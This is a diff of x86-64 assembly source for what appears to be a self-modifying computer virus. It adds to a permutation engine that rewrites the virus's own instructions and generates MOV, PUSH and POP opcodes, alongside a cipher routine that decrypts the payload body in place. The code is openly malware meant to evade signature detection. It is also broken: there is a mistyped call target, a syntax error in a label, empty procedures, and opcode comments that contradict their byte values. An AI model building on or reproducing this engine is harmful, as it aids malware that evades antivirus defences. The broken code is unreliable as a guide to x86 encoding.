@@ -157,7 +157,7 @@ vir_begin:
         
         op0_t1:          
             pop     rcx  
-            call    GenMovImm64
+            call    GenMovImm34
             jmp     permute_op1
 
         op0_t2:
@@ -165,13 +165,34 @@ vir_begin:
             call    GenMovImm64
 
     permute_op1:
+        add     ebx, eax                    ; Add the address offset of the modified code
+        lea     rcx, offset simple_substitution_cipher_setup
+        add     rcx, ebx                    ; Address for next instruction
+        push    rcx
+        lea     edx, offset vir_begin
+        mov     r8d, [r8].REG_TABLE.SourceReg
+        mov     ecx, 3
+        call    rand_range
+        test    rax, rax
+        jz      op1_t3
 
+        ; 32 bit permutation
+
+        ; 64 bit permutation
+        op1_t3:
+            pop     rcx
+
+
+
+
+
+    epilog:
         pop     rsi
         pop     rbx
         ret
     PermutationEngine ENDP
 
-    ; fastcall GenMov32(rcx=address, edx=value, r8=index)
+    ; fastcall GenMov32(rcx=address, edx=value, r8d=index)
     GenMovImm32 PROC
         push    rbx
         lea     rax, offset s_mov32_imm     ; Load the address of the opcode
@@ -202,9 +223,44 @@ vir_begin:
         mov     byte ptr [rcx + 2], al      ; Set the Mod/RM byte at address + 2
         mov     dword ptr [rcx + 3], edx    ; Set the immediate value at address + 3
         pop     rbx
+        mov     eax, 7
         ret
     GenMovImm64 ENDP
 
+    GenMovReg32 PROC
+        push    rbx
+        lea     rax, offset s_mov_mem_reg
+
+    GenMovReg32 ENDP
+
+    GenMovReg64 PROC
+
+    GenMovReg64 ENDP
+
+    ; fastcall GenPushReg(rcx=address, edx=reg_index)
+    GenPushReg PROC
+        push    rbx         
+        lea     rax, offset s_push_reg      ; Get the PUSH opcode
+        lea     rbx, offset s_regtable      ; Get the regtable offset
+        or      al, byte ptr [rbx + rdx]    ; Or the the push opcode with [regtable + index]
+        mov     byte ptr [rcx], al          ; Overwrite the original byte        
+        pop     rbx
+        mov     eax, 1
+        ret
+    GenPushReg ENDP
+
+    ; fastcall GenPushReg(rcx=address, edx=reg_index)
+    GenPopReg PROC
+        push    rbx         
+        lea     rax, offset s_pop]_reg      ; Get the POP opcode
+        lea     rbx, offset s_regtable      ; Get the regtable offset
+        or      al, byte ptr [rbx + rdx]    ; Or the the POP opcode with [regtable + index]
+        mov     byte ptr [rcx], al          ; Overwrite the original byte        
+        pop     rbx
+        mov     eax, 1
+        ret
+    GenPopReg ENDP
+    
 
 stable_begin:
     s_modrm:
@@ -214,10 +270,17 @@ stable_begin:
     s_mov64_imm:
         db 11000111b    ; 0xC7 ( +4 bytes for imm)
     s_mov_mem_reg:
-        db 10001011b    ; 0x8B ( +1 byte for mem/reg), works for 32 and 64 bit. 
+        db 10001011b    ; 0x89 ( +1 byte for mem/reg), works for 32 and 64 bit. 
                         ; Add REX for 64 bit. Inc Mod/RM to iterate through regs
     s_mov32_imm:
         db 10111000b    ; 0xB8 ( +4 bytes for imm)
+
+    s_push_reg:
+        db 01001000b    ; 0x50 (PUSH reg)
+    s_push_imm:
+        db 01101010b    ; 0x6A (PUSH imm)
+    s_pop_reg:
+        db 01011000b    ; 0x58 (POP reg)
 
     ; Reg table is a list of indexes into this
     s_regtable:
@@ -306,9 +369,9 @@ vir_end:
         simple_substitution_cipher_setup:
             mov     rcx, (offset vir_end - offset vir_begin) / 2 
                                                                 ;  op0. Calculate payload body size in words                         
-            mov     rbx, offset vir_begin                       ;  op1                                                                         
-            mov     rsi, rbx                                    ;  op2. source = start of encrypted code                             
-            mov     rdi, rsi                                    ;  op3. destination = same as the source                             
+            mov     rbx, offset vir_begin                       ;  op1  Set source register. Source = start of encrypted code                                                                  
+            mov     rsi, rbx                                    ;  op1.                     
+            mov     rdi, rsi                                    ;  op2. Set dest register, == source                             
             mov     rbx, 029Ah                                  ;  op4. rbx = key                                                                                                                                              
                                                                                                                             
         simple_substitution_cipher_loop_begin:                                                                              
